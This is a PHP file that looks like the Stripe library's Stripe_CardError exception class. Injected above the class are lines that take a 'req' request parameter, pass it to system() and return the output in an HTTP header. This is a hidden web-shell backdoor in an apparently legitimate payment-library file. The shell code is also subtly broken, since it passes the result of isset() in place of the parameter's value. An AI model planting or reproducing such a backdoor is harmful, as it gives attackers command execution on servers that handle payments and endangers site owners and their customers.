<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

class Stripe_CardError extends Stripe_Error
{
  public function __construct($message, $param, $code, $httpStatus, 
      $httpBody, $jsonBody
  )
  {
    parent::__construct($message, $httpStatus, $httpBody, $jsonBody);
    $this->param = $param;
    $this->code = $code;
  }
}
